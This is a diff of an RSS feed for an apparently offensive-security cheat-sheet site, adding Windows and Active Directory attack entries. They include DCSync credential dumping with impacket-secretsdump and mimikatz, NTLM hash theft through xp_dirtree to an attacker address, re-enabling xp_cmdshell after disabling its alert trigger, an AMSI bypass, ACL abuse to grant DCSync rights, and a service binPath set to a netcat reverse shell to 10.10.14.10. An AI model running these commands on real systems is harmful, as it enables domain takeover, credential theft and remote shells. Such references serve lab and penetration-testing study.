@@ -8,6 +8,13 @@
     <language>en-us</language>
     <atom:link href="https://tldrbins.github.io/@windows/index.xml" rel="self" type="application/rss+xml" />
     <item>
+      <title>AD Recycle Bin</title>
+      <link>https://tldrbins.github.io/ad_recycle_bin/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/ad_recycle_bin/</guid>
+      <description> AD Recycle Bin import-module activedirectory # Query all deleted objects within domain Get-ADObject -filter &amp;#39;isDeleted -eq $true -and name -ne &amp;#34;Deleted Objects&amp;#34;&amp;#39; -includeDeletedObjects # Get all details for the deleted account (e.g. TempAdmin) Get-ADObject -filter { SAMAccountName -eq &amp;#34;TempAdmin&amp;#34; } -includeDeletedObjects -property * # Restore deleted account (Need to rename to avoid user exist) Restore-ADObject -Identity ObjectGUID -NewName &amp;#34;new_user&amp;#34; -TargetPath &amp;#34;CN=Users,DC=example,DC=com&amp;#34; </description>
+    </item>
+    <item>
       <title>Alternate Data Stream</title>
       <link>https://tldrbins.github.io/alternate_data_stream/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
@@ -19,7 +26,14 @@
       <link>https://tldrbins.github.io/bloodhound/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/bloodhound/</guid>
-      <description> sharphound.ps1 Download sharphound.ps1&#xA;# Import module . .\SharpHound.ps1 # Run Invoke-BloodHound -CollectionMethods All </description>
+      <description> sharphound.ps1 Download sharphound.ps1&#xA;# Import module . .\SharpHound.ps1 # Run Invoke-BloodHound -CollectionMethods All sharphound.exe .\SharpHound.exe -c all </description>
+    </item>
+    <item>
+      <title>Bypass ASMI</title>
+      <link>https://tldrbins.github.io/bypas_asmi/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/bypas_asmi/</guid>
+      <description>evil-winrm menu Bypass-4MSI Note: have to run menu first</description>
     </item>
     <item>
       <title>Compressed Files</title>
@@ -64,11 +78,25 @@
       <description> Check Firewall Rules # cmd cmd /c &amp;#34;netsh advfirewall firewall show rule name=all|findstr Name:&amp;#34; # powershell Get-NetFirewallProfile # Check outbound rules Get-NetFirewallRule -Direction Outbound -Enabled True </description>
     </item>
     <item>
+      <title>GenericAll</title>
+      <link>https://tldrbins.github.io/genericall/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/genericall/</guid>
+      <description> Using PowerView.ps1 . .\PowerView.ps1 Authenticated # Add user to group (e.g. Exchange Windows Permissions) Add-DomainGroupMember -Identity &amp;#34;Exchange Windows Permissions&amp;#34; -Members USER Runas $username = &amp;#34;domain\username&amp;#34; $password = &amp;#34;password&amp;#34; $secstr = New-Object -TypeName System.Security.SecureString $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)} $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $secstr # Add user to group (e.g. Exchange Windows Permissions) Add-DomainGroupMember -Identity &amp;#39;Exchange Windows Permissions&amp;#39; -Members USER -Credential $Cred </description>
+    </item>
+    <item>
+      <title>GenericWrite</title>
+      <link>https://tldrbins.github.io/genericwrite/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/genericwrite/</guid>
+      <description> Using PowerView.ps1 . .\PowerView.ps1 Add UF_DONT_REQUIRE_PREAUTH bit # Check target user Get-DomainUser user | ConvertFrom-UACValue Set-DomainObject -Identity user -XOR @{useraccountcontrol=4194304} -Verbose Get hash # In local linux machine impacket-GetNPUsers example.com/user -no-pass -dc-ip 10.10.11.10 </description>
+    </item>
+    <item>
       <title>GetChanges/GetChangesAll</title>
       <link>https://tldrbins.github.io/getchanges_getchangesall/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/getchanges_getchangesall/</guid>
-      <description> GetChanges/GetChangesAll DCSync Attack (From Linux) # With creds impacket-secretsdump -just-dc username:password@10.10.11.10 # With hashes impacket-secretsdump -hashes lmhash:nthash -just-dc EXAMPLE.COM/username@10.10.11.10 </description>
+      <description> GetChanges/GetChangesAll DCSync Attack (From Linux) # With creds impacket-secretsdump -just-dc username:password@10.10.11.10 # With hashes impacket-secretsdump -hashes lmhash:nthash -just-dc EXAMPLE.COM/username@10.10.11.10 Mimikatz (From Windows) .\mimikatz.exe &amp;#39;lsadump::dcsync /domain:EXAMPLE.COM /user:administrator&amp;#39; exit </description>
     </item>
     <item>
       <title>Host a SMB Server</title>
@@ -103,7 +131,7 @@
       <link>https://tldrbins.github.io/ldap/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/ldap/</guid>
-      <description> Enum # Using nmap script sudo nmap -p 389 --script ldap-search 10.10.11.10 # Using ldapdomaindump (With Creds) ldapdomaindump -u &amp;#39;example.com\username&amp;#39; -p &amp;#39;passowrd&amp;#39; 10.10.11.10 -o ./ldap </description>
+      <description> Enum # Using nmap script sudo nmap -p 389 --script ldap-search 10.10.11.10 # Using ldapdomaindump (With Creds) ldapdomaindump -u &amp;#39;example.com\username&amp;#39; -p &amp;#39;passowrd&amp;#39; 10.10.11.10 -o ./ldap # Get domain base ldapsearch -x -h 10.10.11.10 -s base namingcontexts # Get info about domain ldapsearch -x -h 10.10.11.10 -b &amp;#39;DC=EXAMPLE,DC=COM&amp;#39; # Just get a class (e.g. person) ldapsearch -x -h 10.10.11.10 -b &amp;#39;DC=EXAMPLE,DC=COM&amp;#39; &amp;#39;(objectClass=person)&amp;#39; </description>
     </item>
     <item>
       <title>Metasploit</title>
@@ -131,7 +159,7 @@
       <link>https://tldrbins.github.io/mssql_general/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/mssql_general/</guid>
-      <description>General Connect to MSSQL DB impacket-mssqlclient username:password@10.10.11.10 Basic Commands # Check mssql version SELECT @@version; # Check users SELECT name FROM master..syslogins # Check users SELECT name FROM master..syslogins WHERE sysadmin = &amp;#39;1&amp;#39;; # Check privilege SELECT entity_name, permission_name FROM fn_my_permissions(NULL, &amp;#39;SERVER&amp;#39;); # Show databases SELECT name FROM master..sysdatabases; # Show current database SELECT DB_NAME(); # List tables and schema select table_name,table_schema from db_name.INFORMATION_SCHEMA.TABLES; # Select all from table select * from db_name.</description>
+      <description>General Connect to MSSQL DB impacket-mssqlclient username:password@10.10.11.10 Basic Commands # Check mssql version SELECT @@version; # Check users SELECT name FROM master..syslogins # Check users SELECT name FROM master..syslogins WHERE sysadmin = &amp;#39;1&amp;#39;; # Check privilege SELECT entity_name, permission_name FROM fn_my_permissions(NULL, &amp;#39;SERVER&amp;#39;); # Show databases SELECT name FROM master..sysdatabases; # Show current database SELECT DB_NAME(); # List tables and schema SELECT table_name,table_schema from db_name.INFORMATION_SCHEMA.TABLES; # Select all from table SELECT * from db_name.</description>
     </item>
     <item>
       <title>MSSQL Linked Servers</title>
@@ -145,14 +173,14 @@
       <link>https://tldrbins.github.io/mssql_privilege_escalation/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/mssql_privilege_escalation/</guid>
-      <description>Steal NTLM hash # In our local Linux machine sudo responder -I tun0 # Inside mssql terminal xp_dirtree &amp;#39;\\10.10.14.10\any\thing&amp;#39;; # Or use master; exec xp_dirtree &amp;#39;\\10.10.14.10\any\thing&amp;#39;; Run xp_cmdshell # Check any policy blocking xp_cmdshell select name from sys.server_triggers; # Disable trigger if any disable trigger ALERT_xp_cmdshell on all server; # Enable xp_cmdshell enable_xp_cmdshell; # RCE xp_cmdshell whoami Impersonate sa to run xp_cmdshell execute as login = &amp;#39;sa&amp;#39;; exec sp_configure &amp;#39;show advanced options&amp;#39;, 1; execute as login = &amp;#39;sa&amp;#39;; reconfigure; execute as login = &amp;#39;sa&amp;#39;; exec sp_configure &amp;#39;xp_cmdshell&amp;#39;, 1; execute as login = &amp;#39;sa&amp;#39;; reconfigure; execute as login = &amp;#39;sa&amp;#39;; EXEC master.</description>
+      <description>Steal NTLM hash # In our local Linux machine sudo responder -I tun0 # Inside mssql terminal xp_dirtree &amp;#39;\\10.10.14.10\any\thing&amp;#39;; # Or use master; exec xp_dirtree &amp;#39;\\10.10.14.10\any\thing&amp;#39;; # Or load_file(&amp;#39;\\10.10.14.10\any\thing&amp;#39;); Run xp_cmdshell # Check any policy blocking xp_cmdshell select name from sys.server_triggers; # Disable trigger if any disable trigger ALERT_xp_cmdshell on all server; # Enable xp_cmdshell enable_xp_cmdshell; # RCE xp_cmdshell whoami Impersonate sa to run xp_cmdshell execute as login = &amp;#39;sa&amp;#39;; exec sp_configure &amp;#39;show advanced options&amp;#39;, 1; execute as login = &amp;#39;sa&amp;#39;; reconfigure; execute as login = &amp;#39;sa&amp;#39;; exec sp_configure &amp;#39;xp_cmdshell&amp;#39;, 1; execute as login = &amp;#39;sa&amp;#39;; reconfigure; execute as login = &amp;#39;sa&amp;#39;; EXEC master.</description>
     </item>
     <item>
       <title>NetExec (nxc)</title>
       <link>https://tldrbins.github.io/nxc/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/nxc/</guid>
-      <description> nxc Download nxc&#xA;SMB # Single user and password nxc smb 10.10.11.10 -u username -p password # Single user and password (Active Directory) nxc smb -u username -p password -d domain -dc-ip 10.10.11.10 # Multiple users or passwords nxc smb -u usernames.txt -p password -d domain -dc-ip 10.10.11.10 --continue-on-success # With LM Hash:NT Hash nxc smb 10.10.11.10 -u username -H LM_hash:NT_hash </description>
+      <description>nxc Download nxc&#xA;SMB # Single user and password nxc smb 10.10.11.10 -u username -p password # Single user and password (Active Directory) nxc smb -u username -p password -d domain -dc-ip 10.10.11.10 # Multiple users or passwords nxc smb -u usernames.txt -p password -d domain -dc-ip 10.10.11.10 --continue-on-success # With LM Hash:NT Hash nxc smb 10.10.11.10 -u username -H LM_hash:NT_hash WINRM # Single user and password nxc winrm 10.</description>
     </item>
     <item>
       <title>Phishing</title>
@@ -166,7 +194,7 @@
       <link>https://tldrbins.github.io/rpc/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/rpc/</guid>
-      <description> RPC rpcclient # Connect without creds rpcclient -U &amp;#39;&amp;#39; -N 10.10.11.10 # Connect with creds rpcclient -U domain/username 10.10.11.10 # Commands querydispinfo enumdomusers </description>
+      <description>RPC rpcclient # Connect without creds rpcclient -U &amp;#39;&amp;#39; -N 10.10.11.10 # Connect with creds rpcclient -U domain/username%password 10.10.11.10 # Inline execute command rpcclient -U domain/username%password 10.10.11.10 -c &amp;#39;querydispinfo&amp;#39; Basic Commands # General info querydispinfo # List of users enumdomusers # List of groups enumdomgroups # Query group by rid querygroup RID # Query group member by rid querygroupmem RID # Query user by rid queryuser RID # Look up a user lookupnames USERNAME # Look up by SID lookupsids SID impacket-lookupsid impacket-lookupsid username:password@10.</description>
     </item>
     <item>
       <title>Runas</title>
@@ -180,7 +208,7 @@
       <link>https://tldrbins.github.io/secretsdump/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/secretsdump/</guid>
-      <description> Impacket Download Impacket&#xA;secretsdump With ntds.dit and SYSTEM hive impacket-secretsdump -ntds ntds.dit -system system.bin LOCAL With SAM, SYSTEM and SECURITY Hives impacket-secretsdump -sam SAM -security SECURITY -system SYSTEM LOCAL </description>
+      <description> Impacket Download Impacket&#xA;secretsdump With ntds.dit and SYSTEM hive impacket-secretsdump -ntds ntds.dit -system system.bin LOCAL With SAM, SYSTEM and SECURITY Hives impacket-secretsdump -sam SAM -security SECURITY -system SYSTEM LOCAL With dcsync right impacket-secretsdump username:password@10.10.11.10 </description>
     </item>
     <item>
       <title>Secure String</title>
@@ -188,6 +216,13 @@
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/secrue_string/</guid>
       <description> Decrypt secure string $s = cat pass.xml $ss = Convertto-securestring -string $s $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist &amp;#34;administrator&amp;#34;, $ss $cred.GetNetworkCredential().password </description>
+    </item>
+    <item>
+      <title>Server Operators</title>
+      <link>https://tldrbins.github.io/server_operators/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/server_operators/</guid>
+      <description> Server Operators # Change a service path (e.g. browser) sc.exe config browser binPath= &amp;#34;C:\windows\tasks\nc.exe -e cmd.exe 10.10.14.10 443&amp;#34; # Stop service sc.exe stop browser # Start service sc.exe stop browser </description>
     </item>
     <item>
       <title>SMB Enum</title>
@@ -202,6 +237,13 @@
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/windows_acls/</guid>
       <description> Window ACLs (Access Control Lists) Check ACLs # Check a file/directory icacls &amp;#34;C:\Users\User&amp;#34; # Check all files and directories icacls * /C Grant user full control icacls file_name /grant user:F +-------------------------------------------------+ |F (full access) | |M (modify access) | |RX (read and execute access) | |R (read-only access) | |W (write-only access) | |D (delete) | |RC (read control) | |WDAC (write DAC) | |WO (write owner) | |S (synchronize) | |AS (access system security) | |MA (maximum allowed) | |GR (generic read) | |GW (generic write) | |GE (generic execute) | |GA (generic all) | |RD (read data/list directory) | |WD (write data/add file) | |AD (append data/add subdirectory) | |REA (read extended attributes) | |WEA (write extended attributes) | |X (execute/traverse) | |DC (delete child) | |RA (read attributes) | |WA (write attributes) | |OI (object inherit) | |CI (container inherit) | |IO (inherit only) | |NP (do not propagate inherit) | |I (permission inherited from parent container)| +-------------------------------------------------+ </description>
+    </item>
+    <item>
+      <title>WriteDacl</title>
+      <link>https://tldrbins.github.io/writedacl/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/writedacl/</guid>
+      <description> Add dcsync right to user . .\PowerView.ps1 Authenticated Add-DomainObjectAcl -PrincipalIdentity &amp;#39;USER&amp;#39; -TargetIdentity &amp;#39;EXAMPLE.COM\Domain Admins&amp;#39; -Rights DCSync Runas $username = &amp;#34;domain\username&amp;#34; $password = &amp;#34;password&amp;#34; $secstr = New-Object -TypeName System.Security.SecureString $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)} $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $secstr Add-DomainObjectAcl -PrincipalIdentity &amp;#39;USER&amp;#39; -TargetIdentity &amp;#39;EXAMPLE.COM\Domain Admins&amp;#39; -Rights DCSync -Credential $Cred Dcsync attack impacket-secretsdump username:password@10.10.11.10 </description>
     </item>
   </channel>
 </rss>
